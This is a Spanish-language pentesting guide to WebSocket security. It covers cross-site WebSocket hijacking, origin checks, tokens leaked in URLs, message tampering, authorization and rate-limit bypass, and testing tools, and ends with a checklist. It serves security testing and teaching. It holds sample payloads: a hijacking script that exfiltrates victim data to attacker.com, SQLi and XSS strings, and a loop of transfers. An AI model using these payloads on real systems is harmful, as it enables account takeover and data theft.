---
title: "WebSocket Security"
description: "Los WebSockets son un punto ciego en la mayoría de los assessments."
category: "Web"
date: 2026-07-18
---
# 🔌 WebSocket Security

Los WebSockets son un punto ciego en la mayoría de los assessments. El handshake es HTTP y hereda sus problemas de auth/origin, pero los desarrolladores suelen tratarlos como un protocolo aparte que "no necesita las mismas protecciones".

---

## Cómo funciona la auth (y falla)

```
Browser                    Server
   |  GET /ws HTTP/1.1       |
   |  Upgrade: websocket      |
   |  Origin: https://target  |
   |  Cookie: session=abc     |
   |------------------------->|
   |  101 Switching Protocols |
   |<-------------------------|
   |  {"action":"getMessages" |
   |   "userId":1337}         |
   |------------------------->|
   |  {"messages":[...]}      |
   |<-------------------------|
```

La auth ocurre **una vez**, en el handshake. Una vez abierto el túnel, no hay autenticación por mensaje.

---

## Cross-Site WebSocket Hijacking (CSWSH)

CSRF para WebSockets. El navegador envía cookies con el handshake sin importar el origen:

```html
<script>
  const ws = new WebSocket('wss://target.com/ws');
  ws.onopen = function() {
    // Conectado con las cookies de la víctima
    ws.send(JSON.stringify({action: 'getAccountData'}));
  };
  ws.onmessage = function(evt) {
    // Exfiltrar todo
    fetch('https://attacker.com/collect?data=' + btoa(evt.data));
  };
</script>
```

### Prueba de origin

```http
GET /ws HTTP/1.1
Host: target.com
Upgrade: websocket
Connection: Upgrade
Origin: https://evil.com       # ← Cambiar
Cookie: session=abc123
```

Si devuelve `101 Switching Protocols` → CSWSH viable.

---

## Token-based handshake

Los tokens en URLs se filtran en logs del server:

```
wss://target.com/ws?token=eyJhbGc...
wss://target.com/ws?auth=SESSION_TOKEN
```

Probar: ¿el token rota por conexión? ¿Se puede reusar?

---

## Message tampering

Modificar mensajes en tránsito con Burp Repeater:

```json
// Original
{"action": "getMyMessages", "userId": 1337}

// Modificado
{"action": "getAllMessages", "userId": 0}
{"action": "getMessages", "userId": 1338}
```

### SQLi via WebSocket

```javascript
ws.send('{"search":"test\'"}');
ws.send('{"user_id":"1 AND 1=1"}');
```

### XSS via WebSocket broadcast

Si el servidor retransmite mensajes sin sanitizar:

```javascript
ws.send('{"message":"<img src=x onerror=alert(1)>"}');
```

---

## Authorization bypass

Muchas apps autentican la conexión WebSocket una vez y nunca verifican permisos después:

```javascript
// Probar acceder a canales que no te pertenecen
ws.send(JSON.stringify({action: 'subscribe', channel: 'admin-notifications'}));
ws.send(JSON.stringify({action: 'read', channel: 'other-user-private'}));
```

---

## Rate limiting bypass

```javascript
// WebSockets a menudo no tienen rate limit
for (let i = 0; i < 10000; i++) {
  ws.send(JSON.stringify({action: 'transfer', amount: 1, to: 'attacker'}));
}
```

---

## Insecure ws://

```bash
# Probar conexión sin TLS
wscat -c ws://target.com/socket

# Si acepta → cualquier atacante en la misma red puede leer/modificar
```

---

## Herramientas

```bash
# STEWS - Security Testing for WebSockets
python3 stews.py -u wss://target.com/socket --discovery
python3 stews.py -u wss://target.com/socket --fuzz

# wscat
npm install -g wscat
wscat -c wss://target.com/socket
wscat -c wss://target.com/socket -H "Cookie: session=abc123"

# Burp: Proxy → WebSockets history
# Burp Repeater: modificar mensajes WebSocket
# Turbo Intruder: fuzzing de mensajes
```

---

## Checklist de prueba

- [ ] Handshake sin Origin validation (CSWSH)
- [ ] Per-message authorization
- [ ] SQLi/XSS en mensajes
- [ ] Rate limiting en mensajes
- [ ] Tokens en URLs del handshake
- [ ] Conexión ws:// insegura
- [ ] Message tampering (IDs de otros usuarios)
- [ ] Broadcast sin sanitizar (XSS almacenado)

---

## CVEs

| CVE | Año | Descripción |
|-----|-----|-------------|
| CVE-2024-11045 | 2024 | CSWSH en stable-diffusion-webui |
| CVE-2026-22689 | 2026 | Mailpit CSWSH |

---

## Relacionado
- **Autenticacion Web** — token-based WS handshake, session reuse
- **CORS Misconfiguration** — Origin validation en handshake
- **CSRF moderno** — CSWSH (Cross-Site WebSocket Hijacking)
- **NoSQL Injection** — SQLi/NoSQLi vía mensajes WS
- **SSRF** — WebSocket upgrade smuggling
- **Claude-BugHunter** (skill `hunt-websocket`)
